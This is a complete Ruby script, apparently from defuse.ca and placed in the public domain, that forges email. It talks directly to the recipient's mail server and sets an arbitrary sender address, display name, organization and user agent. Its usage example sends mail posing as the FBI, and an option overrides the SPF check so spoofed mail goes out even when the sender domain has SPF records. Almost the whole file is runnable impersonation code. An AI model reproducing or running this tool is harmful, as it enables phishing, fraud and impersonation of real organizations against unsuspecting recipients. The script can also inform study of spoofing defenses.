# A Ruby script for spoofing mail directly to the destination's SMTP server.
#                 https://defuse.ca/email-spoofing-in-ruby.htm
#
# This code is in the public domain. Do whatever you want with it.
#
# Usage: mailspoof.rb <options>
#     -t, --to ADDRESS                 Send mail to this email address
#     -f, --from ADDRESS               Send mail from this email address
#     -s, --subject SUBJECT            Mail subject
#     -m, --mail FILE                  File containing email message
#     -i, --ignore-spf                 Ignore SPF records
#     -u, --user-agent AGENT           User agent string
#     -o, --organization ORG           From organization name
#     -n, --human-name NAME            From human name
#     -h, --help                       Display this screen
#
# Example:
#     ruby mailspoof.rb --to 'spamtest@mailinator.com' --from 'root@fbi.gov'  \
#         --subject 'Test spoofed email'  \
#         --organization 'Federal Bureau of Investigation' \
#         --human-name 'FBI' --mail email_body.txt
# 

require 'socket'
require 'optparse'
require 'resolv'

$options = {}

optparse = OptionParser.new do |opts|
  opts.banner = "Usage: #{__FILE__} <options>"

  $options[:to] = nil
  opts.on( '-t', '--to ADDRESS', 'Send mail to this email address' ) do |addr|
    $options[:to] = addr
  end

  $options[:from] = nil
  opts.on( '-f', '--from ADDRESS', 'Send mail from this email address' ) do |addr|
    $options[:from] = addr
  end

  $options[:subject] = nil
  opts.on( '-s', '--subject SUBJECT', 'Mail subject' ) do |subj|
    $options[:subject] = subj
  end

  $options[:mail] = nil
  opts.on( '-m', '--mail FILE', 'File containing email message' ) do |mail|
    $options[:mail] = mail
  end

  $options[:ignorespf] = false
  opts.on( '-i', '--ignore-spf', 'Ignore SPF records' ) do 
    $options[:ignorespf] = true
  end

  $options[:useragent] = 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:16.0) ' +
                          'Gecko/20121010 Thunderbird/16.0.1'
  opts.on( '-u', '--user-agent AGENT', 'User agent string' ) do |agent|
    $options[:useragent] = agent
  end

  $options[:organization] = nil
  opts.on( '-o', '--organization ORG', 'From organization name' ) do |org|
    $options[:organization] = org
  end

  $options[:human] = nil
  opts.on( '-n', '--human-name NAME', 'From human name' ) do |name|
    $options[:human] = name
  end

  opts.on( '-h', '--help', 'Display this screen' ) do
    puts opts
    exit
  end
end

begin
  optparse.parse!
rescue OptionParser::InvalidOption
  STDERR.puts "Invalid option"
  STDERR.puts optparse
  exit
end

if [$options[:to], $options[:from], $options[:subject], $options[:mail]].include? nil
  STDERR.puts "Please specify --to, --from, --subject, and --mail."
  STDERR.puts optparse
  exit
end

def getEmailAddrDomain(email)
  if( email =~ /[a-zA-Z0-9+-]+@(.+)/ )
    return $1
  else
    STDERR.puts "[#{email}] is not a valid email address."
  end
end

# Figure out which mail server to talk to

to_domain = getEmailAddrDomain($options[:to])
from_domain = getEmailAddrDomain($options[:from])

mail_server = nil
Resolv::DNS.open do |dns|
  ress = dns.getresources( to_domain, Resolv::DNS::Resource::IN::MX )
  mail_server = ress.shuffle[0].exchange.to_s
end

puts "[+] Found mail server [#{mail_server}]"

# Check if the from domain has SPF records

unless $options[:ignorespf] 
  Resolv::DNS.open do |dns|
    ress = dns.getresources( from_domain, Resolv::DNS::Resource::IN::TXT )
    ress.each do |resp|
      resp.strings.each do |str|
        if str.downcase.include? "spf"
          print "[!] It looks like #{from_domain} has SPF records.\n" +
          "    The spoofed mail will probably be ignored by the destination.\n" + 
          "    Add --ignore-spf to send the mail anyway.\n\n" + 
          "    The SPF record is:\n    #{str}\n"
          exit( 2 )
        end
      end
    end
  end
else
  puts "[!] Not checking for SPF records."
end

# Fix up the message body
body = File.read($options[:mail])
# Dirty way of normalizing all line endings to \r\n
body.gsub!("\r\n", "\n")
body.gsub!("\r", "\n")
body.gsub!("\n", "\r\n")
# Don't end the DATA  prematurely
body.gsub!(/^\.$/, ". ")

# Finally, connect to the mail server and send the mail

response_lines = []

begin
  puts "[-] Connecting to [#{mail_server}]..."
  s = TCPSocket.new(  mail_server , 25 ) # SMTP
  puts "[-] Connected to [#{mail_server}]. Delivering mail..."

  s.print "HELO #{to_domain}\r\n"
  response_lines << s.gets
  s.print "MAIL FROM: <#{$options[:from]}>\r\n"
  response_lines << s.gets
  s.print "RCPT TO: <#{$options[:to]}>\r\n"
  response_lines << s.gets
  s.print "DATA\r\n"
  response_lines << s.gets
  s.print "To: <#{$options[:to]}>\r\n"
  if $options[:human]
    s.print "From: #{$options[:human]} <#{$options[:from]}>\r\n"
  else
    s.print "From: <#{$options[:from]}>\r\n"
  end
  s.print "Reply-To: #{$options[:from]}\r\n"
  s.print "Organization: #{$options[:organization]}\r\n" if $options[:organization]
  s.print "User-Agent: #{$options[:useragent]}\r\n"
  s.print "Subject: #{$options[:subject]}\r\n"
  s.print body
  s.print "\r\n"
  s.print "\r\n.\r\n"
  response_lines << s.gets
  s.print "QUIT\r\n"
  response_lines << s.gets
rescue StandardError => e
  puts "[!] Error communicating with mail server:"
  puts "    " + e.message
  exit( 4 )
end

s.close

# Check if the server reported any errors...
response_lines.each do |lin|
  lin =~ /^(\d+)/
  code = $1.to_i
  if [421, 450, 451, 452, 500, 501, 502, 503,
      504, 521, 530, 550, 551, 552, 553, 554].include? code
    puts "[!] Something went wrong. I got an error code [#{code}]. \n" + 
      "    The mail server said:\n"
    response_lines.each { |l| puts "        " + l }
    exit( 3 )
  end
end

puts "[+] Mail sent."

exit( true )
